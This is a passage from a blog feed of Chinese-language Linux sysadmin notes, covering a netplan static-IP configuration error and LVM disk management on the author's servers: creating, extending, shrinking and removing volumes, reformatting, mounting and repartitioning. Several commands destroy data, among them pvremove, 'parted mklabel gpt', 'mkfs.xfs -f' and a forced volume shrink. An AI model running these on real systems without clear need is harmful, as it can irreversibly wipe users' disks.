src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225942.png" alt="image.png"></p><h2 id="sysdig"><a href="#sysdig" class="headerlink" title="sysdig"></a>sysdig</h2><p>完整的过滤器列表可以使用 sysdig -l 来查看</p><h2 id="命令和网址"><a href="#命令和网址" class="headerlink" title="命令和网址"></a>命令和网址</h2><p><a href="https://kubernetes.io/zh-cn/docs/reference/kubectl/cheatsheet/">kubectl 备忘单</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>网卡没有ip</title>
    <link href="/2022/12/28/net/%E7%BD%91%E5%8D%A1%E6%B2%A1%E6%9C%89ip/"/>
    <url>/2022/12/28/net/%E7%BD%91%E5%8D%A1%E6%B2%A1%E6%9C%89ip/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221228224845.png" alt="image.png"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-string">root@ningan</span> <span class="hljs-string">netplan</span>]<span class="hljs-comment"># cat 01-network-manager-all.yaml</span><br><span class="hljs-comment"># Let NetworkManager manage all devices on this system</span><br><span class="hljs-attr">network:</span><br>  <span class="hljs-attr">version:</span> <span class="hljs-number">2</span><br>  <span class="hljs-attr">renderer:</span> <span class="hljs-string">NetworkManager</span><br>  <span class="hljs-attr">ethernets:</span><br>    <span class="hljs-attr">eth0:</span><br>      <span class="hljs-attr">dhcp4:</span> <span class="hljs-literal">yes</span><br>      <span class="hljs-attr">dhcp6:</span> <span class="hljs-literal">yes</span><br>    <span class="hljs-attr">eth1:</span><br>      <span class="hljs-attr">dhcp4:</span> <span class="hljs-literal">no</span><br>      <span class="hljs-attr">dhcp6:</span> <span class="hljs-literal">no</span><br>      <span class="hljs-attr">addresses:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.201</span><span class="hljs-string">/24</span><br>      <span class="hljs-attr">routes:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">to:</span> <span class="hljs-string">default</span><br>          <span class="hljs-attr">via:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.20</span><br>      <span class="hljs-attr">nameservers:</span><br>        <span class="hljs-attr">addresses:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span><br><br>[<span class="hljs-string">root@ningan</span> <span class="hljs-string">netplan</span>]<span class="hljs-comment"># netplan apply</span><br><br><span class="hljs-string">(generate:22000):</span> <span class="hljs-string">GLib-WARNING</span> <span class="hljs-string">**:</span> <span class="hljs-attr">23:11:36.612:</span> <span class="hljs-string">GError</span> <span class="hljs-string">set</span> <span class="hljs-string">over</span> <span class="hljs-string">the</span> <span class="hljs-string">top</span> <span class="hljs-string">of</span> <span class="hljs-string">a</span> <span class="hljs-string">previous</span> <span class="hljs-string">GError</span> <span class="hljs-string">or</span> <span class="hljs-string">uninitialized</span> <span class="hljs-string">memory.</span><br><span class="hljs-string">This</span> <span class="hljs-string">indicates</span> <span class="hljs-string">a</span> <span class="hljs-string">bug</span> <span class="hljs-string">in</span> <span class="hljs-string">someone&#x27;s</span> <span class="hljs-string">code.</span> <span class="hljs-string">You</span> <span class="hljs-string">must</span> <span class="hljs-string">ensure</span> <span class="hljs-string">an</span> <span class="hljs-string">error</span> <span class="hljs-string">is</span> <span class="hljs-literal">NULL</span> <span class="hljs-string">before</span> <span class="hljs-string">it&#x27;s</span> <span class="hljs-string">set.</span><br><span class="hljs-attr">The overwriting error message was: /etc/netplan/01-network-manager-all.yaml:15:9: Error in network definition:</span> <span class="hljs-string">unicast</span> <span class="hljs-string">route</span> <span class="hljs-string">must</span> <span class="hljs-string">include</span> <span class="hljs-string">both</span> <span class="hljs-string">a</span> <span class="hljs-string">&#x27;to&#x27;</span> <span class="hljs-string">and</span> <span class="hljs-string">&#x27;via&#x27;</span> <span class="hljs-string">IP</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">to:</span> <span class="hljs-string">default</span><br>        <span class="hljs-string">^</span><br><span class="hljs-string">/etc/netplan/01-network-manager-all.yaml:15:15:</span> <span class="hljs-attr">Error in network definition:</span> <span class="hljs-string">invalid</span> <span class="hljs-string">IP</span> <span class="hljs-string">family</span> <span class="hljs-string">&#x27;-1&#x27;</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">to:</span> <span class="hljs-string">default</span><br>              <span class="hljs-string">^</span><br><br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Let NetworkManager manage all devices on this system</span><br><span class="hljs-attr">network:</span><br>  <span class="hljs-attr">version:</span> <span class="hljs-number">2</span><br>  <span class="hljs-attr">renderer:</span> <span class="hljs-string">NetworkManager</span><br>  <span class="hljs-attr">ethernets:</span><br>    <span class="hljs-attr">eth0:</span><br>      <span class="hljs-attr">dhcp4:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">eth1:</span>                           <span class="hljs-comment"># 配置网卡的名称,通过 ip a 命令查看</span><br>      <span class="hljs-attr">dhcp4:</span> <span class="hljs-literal">false</span>                    <span class="hljs-comment"># 关闭 DHCP，如果需要打开 DHCP 则写 true</span><br>      <span class="hljs-attr">addresses:</span> [<span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.201</span><span class="hljs-string">/24</span>]    <span class="hljs-comment"># 配置的静态 IP 地址和掩码</span><br>      <span class="hljs-attr">optional:</span> <span class="hljs-literal">true</span><br>      <span class="hljs-attr">gateway4:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.20</span>            <span class="hljs-comment"># 网关地址</span><br>      <span class="hljs-attr">nameservers:</span><br>        <span class="hljs-attr">addresses:</span> [<span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span>,<span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span>]       <span class="hljs-comment"># DNS 服务器地址，多个 DNS 服务器地址需要用英文逗号分隔开</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【linux系列】(202212) 磁盘管理</title>
    <link href="/2022/12/28/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202212)%20%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"/>
    <url>/2022/12/28/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202212)%20%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">查看磁盘使用率<br><span class="hljs-built_in">df</span> -h<br>查看单个目录的挂载情况(目录属于哪个分区)<br><span class="hljs-built_in">df</span> -h /home<br><br>fdisk -l<br>lsblk<br><span class="hljs-comment"># 查看文件系统类型</span><br>lsblk -f <br><br>lvremove<br>vgremove<br>pvremove<br><br><span class="hljs-comment"># fdisk /dev/sdb</span><br>:d  <span class="hljs-comment"># 删除</span><br>:w  <span class="hljs-comment"># 保存</span><br>dos分区表 一个分区最大2T<br>gpt分区表 不限制<br><br>查看是不是ssd<br><span class="hljs-comment"># 使用lsblk命令进行判断，参数-d表示仅显示设备本身（不显示其上分区），参数-o表示仅显示特定的列。</span><br><span class="hljs-comment"># # 0是ssd 1是hdd</span><br><span class="hljs-comment"># lsblk -d -o name,rota   </span><br><span class="hljs-comment"># grep ^ /sys/block/*/queue/rotational</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost ~]<span class="hljs-comment"># lvremove /dev/mapper/vgqjc-lvqjc </span><br>Do you really want to remove active logical volume vgqjc/lvqjc? [y/n]: y<br>  Logical volume <span class="hljs-string">&quot;lvqjc&quot;</span> successfully removed<br>[root@localhost ~]<span class="hljs-comment"># vgremove /dev/mapper/vgqjc</span><br>  Volume group <span class="hljs-string">&quot;vgqjc&quot;</span> successfully removed<br>[root@localhost ~]<span class="hljs-comment"># pvremove /dev/sdl</span><br>  Labels on physical volume <span class="hljs-string">&quot;/dev/sdl&quot;</span> successfully wiped.<br>[root@localhost ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@zqzt-wx13f33-zbhx08w ~]<span class="hljs-comment"># lsblk -d -o name,rota</span><br>NAME ROTA<br>sda     1<br>sdb     1<br>[root@zqzt-wx13f33-zbhx08w ~]<span class="hljs-comment">#</span><br>[root@zqzt-wx13f33-zbhx08w ~]<span class="hljs-comment"># grep ^ /sys/block/*/queue/rotational</span><br>/sys/block/dm-0/queue/rotational:1<br>/sys/block/dm-1/queue/rotational:1<br>/sys/block/sda/queue/rotational:1<br>/sys/block/sdb/queue/rotational:1<br><br></code></pre></td></tr></table></figure><p><code>fdisk</code>命令中device通常是<code>/dev/hda</code>、<code>/dev/hdb</code>….(IDE接口类型的硬盘设备名)或<code>/dev/sda</code>、<code>/dev/sdb</code>….(SCSI接口类型硬盘设备名)，表示整个硬盘，如果硬盘被分区，则在设备名后追加一个数字表示此设备的第几个分区。如上例中的<code>/dev/sda1</code>和<code>/dev/sda2</code></p><p>疑问：<br>1.IDE接口类型的硬盘和SCSI接口类型硬盘有什么区别？<br>2.&#x2F;etc&#x2F;mtab和&#x2F;etc&#x2F;fstab的区别？</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gcode">lvdisplay<br>pvdisplay<br>vgdisplay<br><br>可以使用pvdisplay 或者p<span class="hljs-attr">vscan查看创建的物理卷  </span><br><span class="hljs-attr">使用vgdisplay 或者vgscan 查看卷组  </span><br><span class="hljs-attr">使用lvscan 或者lvdisplay查看[逻辑卷](https://so.csdn.net/so/search?q=%E9</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span>BB<span class="hljs-meta">%</span>E<span class="hljs-number">8</span><span class="hljs-meta">%</span>BE<span class="hljs-meta">%</span><span class="hljs-number">91</span><span class="hljs-meta">%</span>E<span class="hljs-number">5</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>D<span class="hljs-meta">%</span>B<span class="hljs-number">7</span>&amp;spm=<span class="hljs-number">1001.2101</span><span class="hljs-number">.3001</span><span class="hljs-number">.7020</span>)  <br>使用df -h查看是否创建成功<br></code></pre></td></tr></table></figure><h2 id="需求1：扩容某一个文件系统目录"><a href="#需求1：扩容某一个文件系统目录" class="headerlink" title="需求1：扩容某一个文件系统目录"></a>需求1：扩容某一个文件系统目录</h2><h3 id="当前情况"><a href="#当前情况" class="headerlink" title="当前情况"></a>当前情况</h3><p>当前磁盘情况</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230324155257.png" alt="image.png"></p><p>查看你文件系统类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsblk -f<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230324155421.png" alt="image.png"></p><p>当前pv，vg，lv情况：<br>当前sdb下有sdb1分区<br>基于&#x2F;dev&#x2F;sdb1创建了pv </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pvcreate  /dev/sdb1 --force<br></code></pre></td></tr></table></figure><p>基于pv创建了vg(datavg为vg的名字)                 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vgcreate  datavg /dev/sdb1<br></code></pre></td></tr></table></figure><p>基于datavg创建了lv(lv_data_xxx_data为lv的名字)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo lvcreate  -L 4T -n lv_data_xxx_data datavg<br>sudo mkfs.xfs  -f /dev/mapper/datavg-lv_data_xxx_data<br></code></pre></td></tr></table></figure><p>挂载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mount  /dev/mapper/datavg-lv_data_xxx_data /vdata/xxx/data<br></code></pre></td></tr></table></figure><h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><p>想把sdc到sdm这些磁盘全部挂载到&#x2F;vdata&#x2F;tg-paas&#x2F;data下，该如何实现？</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo parted  -s /dev/sdc mklabel gpt<br>sudo parted  -s /dev/sdc mkpart primary xfs 0 100%<br>sudo mkfs.xfs  -f /dev/sdc1<br><br>sudo pvcreate  /dev/sdc1 --force<br><br>sudo vgextend datavg /dev/sdc1<br><br>lvresize -L +9.1T /dev/mapper/datavg-lv_data_xxx_data<br><br><span class="hljs-comment"># 使用xfs_groupfs进行在线调整xfs格式的文件系统大小</span><br><span class="hljs-comment"># lsblk -f 查看文件系统类型</span><br>xfs_growfs /dev/mapper/datavg-lv_data_xxx_data<br><br><span class="hljs-comment"># 查看已经扩容成功</span><br>lsblk<br><span class="hljs-built_in">df</span> -h<br></code></pre></td></tr></table></figure><h2 id="需求2：给某个目录-x2F-var-x2F-www-x2F-html挂盘"><a href="#需求2：给某个目录-x2F-var-x2F-www-x2F-html挂盘" class="headerlink" title="需求2：给某个目录&#x2F;var&#x2F;www&#x2F;html挂盘"></a>需求2：给某个目录&#x2F;var&#x2F;www&#x2F;html挂盘</h2><h3 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsblk<br><span class="hljs-built_in">df</span> -h | <span class="hljs-built_in">head</span> -n 20<br><br><span class="hljs-built_in">mkdir</span> -p /var/www/html<br><br><br>lvdisplay | sudo grep  lv_pkg<br>sudo lvcreate  -L 200G -n lv_pkg datavg<br>sudo mkfs.xfs  -f /dev/mapper/datavg-lv_pkg<br>sudo mount  | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg on /var/www/html&quot;</span><br>sudo mount  /dev/mapper/datavg-lv_pkg /var/www/html<br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg&quot;</span><br>sudo <span class="hljs-built_in">cat</span>  /etc/mtab  | sudo grep  datavg-lv_pkg &gt;&gt; /etc/fstab<br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg&quot;</span><br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab<br><br>sudo <span class="hljs-built_in">df</span> -h |grep html<br><span class="hljs-built_in">df</span> -h | grep var<br></code></pre></td></tr></table></figure><h3 id="解挂"><a href="#解挂" class="headerlink" title="解挂"></a>解挂</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># df -h | grep var</span><br>/dev/mapper/rootvg-lv_var               60G   49G   12G  81% /var<br>/dev/mapper/datavg-lv_log_tg_paas      500G  3.6G  497G   1% /var/log/tg-paas<br>/dev/mapper/datavg-lv_log_pods         500G  3.8G  497G   1% /var/log/pods<br>/dev/mapper/datavg-lv_pkg              1.0T  7.2G 1017G   1% /var/www/html<br><span class="hljs-comment"># cd ~</span><br><span class="hljs-comment"># umount /dev/mapper/datavg-lv_pkg</span><br><span class="hljs-comment"># df -h | grep var</span><br>/dev/mapper/rootvg-lv_var               60G   49G   12G  81% /var<br>/dev/mapper/datavg-lv_log_tg_paas      500G  3.6G  497G   1% /var/log/tg-paas<br>/dev/mapper/datavg-lv_log_pods         500G  3.8G  497G   1% /var/log/pods<br><br><span class="hljs-comment"># lsblk</span><br>NAME                          MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sda                             8:0    0 446.1G  0 disk <br>├─sda1                          8:1    0   512M  0 part /boot/efi<br>├─sda2                          8:2    0     1G  0 part /boot<br>└─sda3                          8:3    0 444.6G  0 part <br>  ├─rootvg-lv_root            252:0    0    20G  0 lvm  /<br>  ├─rootvg-lv_swap            252:1    0    16G  0 lvm  <br>  ├─rootvg-lv_var             252:3    0    60G  0 lvm  /var<br>  ├─rootvg-lv_home            252:6    0    20G  0 lvm  /home<br>  └─rootvg-lv_kerneldata_etcd 252:8    0    50G  0 lvm  /kerneldata/etcd<br>sdb                             8:16   0   4.9T  0 disk <br>└─sdb1                          8:17   0   4.9T  0 part <br>  ├─datavg-lv_data            252:2    0   500G  0 lvm  /vdata<br>  ├─datavg-lv_data_net        252:4    0   100G  0 lvm  /vdata/net<br>  ├─datavg-lv_log_pods        252:5    0   500G  0 lvm  /var/log/pods<br>  ├─datavg-lv_log_tg_paas     252:7    0   500G  0 lvm  /var/log/tg-paas<br>  └─datavg-lv_pkg             252:9    0     1T  0 lvm  <br><br><br><span class="hljs-comment"># lvresize -L 200G /dev/mapper/datavg-lv_pkg</span><br>  WARNING: Reducing active logical volume to 200.00 GiB.<br>  THIS MAY DESTROY YOUR DATA (filesystem etc.)<br>Do you really want to reduce datavg/lv_pkg? [y/n]: y<br>  Size of logical volume datavg/lv_pkg changed from 1.00 TiB (262144 extents) to 200.00 GiB (51200 extents).<br>  Logical volume datavg/lv_pkg successfully resized.<br><br><br><span class="hljs-comment"># lsblk</span><br>NAME                          MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sda                             8:0    0 446.1G  0 disk <br>├─sda1                          8:1    0   512M  0 part /boot/efi<br>├─sda2                          8:2    0     1G  0 part /boot<br>└─sda3                          8:3    0 444.6G  0 part <br>  ├─rootvg-lv_root            252:0    0    20G  0 lvm  /<br>  ├─rootvg-lv_swap            252:1    0    16G  0 lvm  <br>  ├─rootvg-lv_var             252:3    0    60G  0 lvm  /var<br>  ├─rootvg-lv_home            252:6    0    20G  0 lvm  /home<br>  └─rootvg-lv_kerneldata_etcd 252:8    0    50G  0 lvm  /kerneldata/etcd<br>sdb                             8:16   0   4.9T  0 disk <br>└─sdb1                          8:17   0   4.9T  0 part <br>  ├─datavg-lv_data            252:2    0   500G  0 lvm  /vdata<br>  ├─datavg-lv_data_net        252:4    0   100G  0 lvm  /vdata/net<br>  ├─datavg-lv_log_pods        252:5    0   500G  0 lvm  /var/log/pods<br>  ├─datavg-lv_log_tg_paas     252:7    0   500G  0 lvm  /var/log/tg-paas<br>  └─datavg-lv_pkg             252:9    0   200G  0 lvm  <br><br><br>sudo mkfs.xfs  -f /dev/mapper/datavg-lv_pkg<br>sudo mount  | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg on /var/www/html&quot;</span><br>sudo mount  /dev/mapper/datavg-lv_pkg /var/www/html<br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg&quot;</span><br><br>删除对应行<br><br><br>sudo <span class="hljs-built_in">cat</span>  /etc/mtab  | sudo grep  datavg-lv_pkg &gt;&gt; /etc/fstab<br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg&quot;</span><br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab<br><br><br></code></pre></td></tr></table></figure><h2 id="需求3：sdb下面分了三个区，想要变成1个"><a href="#需求3：sdb下面分了三个区，想要变成1个" class="headerlink" title="需求3：sdb下面分了三个区，想要变成1个"></a>需求3：sdb下面分了三个区，想要变成1个</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># lsblk</span><br>NAME                          MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sda                             8:0    0 893.8G  0 disk <br>├─sda1                          8:1    0   512M  0 part /boot/efi<br>├─sda2                          8:2    0     1G  0 part /boot<br>└─sda3                          8:3    0 892.3G  0 part <br>  ├─rootvg-lv_root            252:0    0    20G  0 lvm  /<br>  ├─rootvg-lv_swap            252:1    0    16G  0 lvm  [SWAP]<br>  ├─rootvg-lv_var             252:2    0    60G  0 lvm  /var<br>  ├─rootvg-lv_home            252:3    0    20G  0 lvm  /home<br>  └─rootvg-lv_kerneldata_etcd 252:4    0    50G  0 lvm  /kerneldata/etcd<br>sdb                             8:16   0  29.1T  0 disk <br>├─sdb1                          8:17   0   512M  0 part <br>├─sdb2                          8:18   0     1G  0 part <br>└─sdb3                          8:19   0   7.3T  0 part <br>sdc                             8:32   0  29.1T  0 disk <br>nvme1n1                       259:0    0   1.5T  0 disk <br>nvme0n1                       259:1    0   1.5T  0 disk <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># ls /dev/sdb1</span><br>/dev/sdb1<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># echo $?</span><br>0<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># sudo ls -l /dev/mapper/ | sudo grep datavg</span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># echo $?</span><br>1<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># sudo parted  -s /dev/sdb mklabel gpt</span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># lsblk</span><br>NAME                          MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sda                             8:0    0 893.8G  0 disk <br>├─sda1                          8:1    0   512M  0 part /boot/efi<br>├─sda2                          8:2    0     1G  0 part /boot<br>└─sda3                          8:3    0 892.3G  0 part <br>  ├─rootvg-lv_root            252:0    0    20G  0 lvm  /<br>  ├─rootvg-lv_swap            252:1    0    16G  0 lvm  [SWAP]<br>  ├─rootvg-lv_var             252:2    0    60G  0 lvm  /var<br>  ├─rootvg-lv_home            252:3    